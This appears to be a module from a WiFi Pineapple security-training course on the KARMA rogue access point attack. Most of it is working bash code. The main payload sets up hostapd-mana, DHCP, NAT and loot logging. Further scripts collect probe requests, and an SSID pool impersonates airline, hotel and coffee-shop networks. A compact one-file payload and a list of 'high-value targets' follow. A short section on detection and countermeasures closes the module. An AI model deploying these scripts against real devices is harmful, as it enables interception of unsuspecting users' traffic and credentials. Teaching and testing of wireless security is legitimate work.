# PP-I03: KARMA Attack

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I03 |
| **Name** | KARMA Attack |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Respond to all probe requests |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle) |

## What This Payload Does

Implements a KARMA (Karma Attack Radio Media Access) attack where the rogue AP responds to ANY network probe request, claiming to be whatever network the client is looking for.

---

## Understanding KARMA

```
┌─────────────────────────────────────────────────────────────┐
│                    KARMA ATTACK                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   VICTIM DEVICE                     KARMA AP                │
│        │                               │                    │
│        │─── Probe: "HomeNetwork?" ────►│                    │
│        │                               │                    │
│        │◄── "Yes, I am HomeNetwork!" ──│                    │
│        │                               │                    │
│        │─── Probe: "WorkWiFi?" ───────►│                    │
│        │                               │                    │
│        │◄── "Yes, I am WorkWiFi!" ─────│                    │
│        │                               │                    │
│        │─── Probe: "CoffeeShop?" ─────►│                    │
│        │                               │                    │
│        │◄── "Yes, I am CoffeeShop!" ───│                    │
│        │                               │                    │
│   ════════════════════════════════════════════════════      │
│   Client auto-connects to "remembered" network!             │
│                                                              │
│   WHY IT WORKS:                                             │
│   • Devices probe for saved networks                        │
│   • They trust any AP claiming to be that SSID              │
│   • Open networks connect automatically                     │
│   • WPA networks prompt for password (less effective)       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I03
# Name: KARMA Attack
# Description: Respond to all probe requests
# Author: Security Training
# WARNING: Authorized testing only!
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan0"
GATEWAY_IP="192.168.4.1"
KARMA_LOG="/sd/loot/karma/probes.log"
CONNECTED_LOG="/sd/loot/karma/connected.log"

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-i03.log"
HOSTAPD_CONF="/tmp/karma_hostapd.conf"
DNSMASQ_CONF="/tmp/karma_dnsmasq.conf"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Stopping KARMA attack..."
    killall hostapd dnsmasq 2>/dev/null
    iptables -t nat -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# MAIN
# ============================================
log "Starting PP-I03: KARMA Attack"

mkdir -p "$(dirname $KARMA_LOG)"

# Check for hostapd-mana or karma-capable hostapd
if command -v hostapd-mana >/dev/null 2>&1; then
    HOSTAPD_CMD="hostapd-mana"
    KARMA_SUPPORT=true
elif grep -q "enable_karma" /etc/hostapd.conf 2>/dev/null; then
    HOSTAPD_CMD="hostapd"
    KARMA_SUPPORT=true
else
    HOSTAPD_CMD="hostapd"
    KARMA_SUPPORT=false
    log "WARNING: KARMA support not detected. Using PineAP fallback."
fi

# Kill interfering processes
airmon-ng check kill 2>/dev/null

# Configure interface
ip link set "$INTERFACE" down
ip addr flush dev "$INTERFACE"
ip addr add "$GATEWAY_IP/24" dev "$INTERFACE"
ip link set "$INTERFACE" up

# ============================================
# HOSTAPD-MANA CONFIG (if available)
# ============================================
if [ "$KARMA_SUPPORT" = true ]; then
    cat > "$HOSTAPD_CONF" << EOF
# KARMA-enabled hostapd configuration
interface=$INTERFACE
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0

# KARMA settings
enable_karma=1
karma_loud=0

# Logging
logger_syslog=-1
logger_stdout=-1
logger_stdout_level=2

# Log probes to file
mana_wpaout=$KARMA_LOG
EOF
else
    # Standard hostapd (no KARMA)
    cat > "$HOSTAPD_CONF" << EOF
interface=$INTERFACE
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wpa=0
EOF
fi

# ============================================
# DNSMASQ CONFIG
# ============================================
cat > "$DNSMASQ_CONF" << EOF
interface=$INTERFACE
dhcp-range=192.168.4.100,192.168.4.200,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
server=8.8.8.8
log-queries
log-dhcp
dhcp-leasefile=/tmp/karma_leases.txt
EOF

# ============================================
# ENABLE FORWARDING
# ============================================
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i "$INTERFACE" -j ACCEPT

# ============================================
# START SERVICES
# ============================================
log "Starting dnsmasq..."
dnsmasq -C "$DNSMASQ_CONF" &
sleep 2

log "Starting $HOSTAPD_CMD with KARMA..."
$HOSTAPD_CMD "$HOSTAPD_CONF" 2>&1 | tee -a "$LOG_FILE" &
HOSTAPD_PID=$!
sleep 3

if ! kill -0 $HOSTAPD_PID 2>/dev/null; then
    log "ERROR: hostapd failed to start"
    cleanup
fi

# ============================================
# PINEAP ALTERNATIVE
# ============================================
# If using WiFi Pineapple's built-in PineAP
if [ -f /pineapple/modules/PineAP/module.php ]; then
    log "PineAP detected - enabling KARMA via API..."
    # Enable via web API if available
    curl -s "http://172.16.42.1:1471/api/pineap/karma/enable" 2>/dev/null
fi

# ============================================
# MONITORING
# ============================================
echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║            KARMA ATTACK ACTIVE                     ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  Interface: $INTERFACE"
echo "║  Gateway:   $GATEWAY_IP"
echo "║  Mode:      $([ "$KARMA_SUPPORT" = true ] && echo "Full KARMA" || echo "Basic AP")"
echo "╚════════════════════════════════════════════════════╝"
echo ""
echo "Listening for probe requests..."
echo ""

# Monitor probes and connections
while true; do
    # Check for new connections
    if [ -f /tmp/karma_leases.txt ]; then
        NEW_CLIENTS=$(tail -1 /tmp/karma_leases.txt 2>/dev/null)
        if [ -n "$NEW_CLIENTS" ]; then
            echo "[CLIENT] $NEW_CLIENTS" | tee -a "$CONNECTED_LOG"
        fi
    fi

    # If KARMA logging is active
    if [ -f "$KARMA_LOG" ]; then
        tail -1 "$KARMA_LOG" 2>/dev/null
    fi

    sleep 2
done
```

---

## KARMA Variants

### KARMA Classic
Responds to all probes for any SSID:
```
Client probes: "HomeNetwork"
KARMA responds: "I am HomeNetwork"
```

### KARMA Loud
Actively broadcasts all collected SSIDs:
```
Broadcasts: "HomeNetwork", "WorkWiFi", "Airport_Free"...
Makes more devices connect but very noisy
```

### Selective KARMA
Only responds to specific SSIDs:
```
Target list: "CorporateWiFi", "Company-Guest"
Ignores other probes
```

---

## Probe Collection Script

```bash
#!/bin/bash
# Collect probe requests without KARMA
# Useful for building target list

INTERFACE="wlan1mon"
OUTPUT="/tmp/probes.txt"

airodump-ng --write-interval 1 -o csv -w /tmp/scan "$INTERFACE" &
PID=$!

sleep 60

kill $PID 2>/dev/null

# Extract probed SSIDs
grep "Station MAC" /tmp/scan-01.csv -A 1000 | \
    cut -d',' -f7 | \
    tr ',' '\n' | \
    sort | uniq -c | sort -rn > "$OUTPUT"

echo "Top probed SSIDs:"
head -20 "$OUTPUT"
```

---

## Building SSID Pool

Effective KARMA attacks use common SSIDs:

```bash
# Common SSIDs to add
COMMON_SSIDS=(
    "attwifi"
    "xfinitywifi"
    "Starbucks"
    "Google Starbucks"
    "McDonalds Free WiFi"
    "Airport_Free_WiFi"
    "Hotel_Guest"
    "Marriott_GUEST"
    "Hilton_Honors"
    "Southwest_WiFi"
    "United_Wi-Fi"
    "AmericanAirlines"
    "Boingo Hotspot"
    "HOME-XXXX"  # Common default
    "NETGEAR"
    "linksys"
    "default"
)

# Add to PineAP pool
for ssid in "${COMMON_SSIDS[@]}"; do
    echo "$ssid" >> /etc/pineapple/ssid_pool.txt
done
```

---

## Red Team Perspective

### Why KARMA Works
1. **Devices broadcast saved networks** - Privacy leak
2. **Auto-connect to "known" networks** - Convenience exploit
3. **No verification of AP identity** - Trust model flaw
4. **Open networks connect silently** - No user interaction

### High-Value Targets
- Corporate networks (credential reuse)
- Airline WiFi (business travelers)
- Hotel networks (names reveal travel)
- Home networks (personal devices)

### OPSEC Notes
- KARMA is VERY noisy
- Creates many broadcast frames
- Easily detected by WIDS
- Use targeted mode when possible

---

## Blue Team Perspective

### Detection

```bash
# Detect KARMA by watching for rapid SSID changes
airodump-ng wlan0mon | grep -E "ESSID.*changed"

# Alert on AP responding to probes it shouldn't know
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x05" | \
    while read line; do
        echo "[PROBE RESPONSE] $line"
    done
```

### Indicators of KARMA
1. **Single AP claiming multiple SSIDs**
2. **Rapid beacon changes**
3. **Unusual probe response patterns**
4. **AP knows SSIDs never broadcast locally**

### Countermeasures
1. **Disable auto-connect** to open networks
2. **Forget unused networks** from device
3. **Use randomized MAC** when probing
4. **Verify network** before entering credentials
5. **Deploy WIDS** to detect KARMA

---

## Practice Exercises

### Exercise 1: Probe Collection
Run passive collection to see what SSIDs devices probe for.

### Exercise 2: Targeted KARMA
Set up KARMA for only corporate-sounding SSIDs.

### Exercise 3: Detection Script
Create a script that detects KARMA attacks.

---

## Payload File

Save as `PP-I03_KARMA_Attack.sh`:

```bash
#!/bin/bash
# PP-I03: KARMA Attack (Compact)
# Requires hostapd-mana for full KARMA
IFACE="${1:-wlan0}"
ip addr add 192.168.4.1/24 dev $IFACE 2>/dev/null
echo "interface=$IFACE
ssid=FreeWiFi
channel=6
enable_karma=1" > /tmp/karma.conf
echo 1 > /proc/sys/net/ipv4/ip_forward
dnsmasq --interface=$IFACE --dhcp-range=192.168.4.100,192.168.4.200 &
hostapd-mana /tmp/karma.conf || hostapd /tmp/karma.conf
```

---

[← PP-I02 Captive Portal](PP-I02_Captive_Portal.md) | [Back to Intermediate](README.md) | [Next: PP-I04 SSL Strip →](PP-I04_SSL_Strip.md)
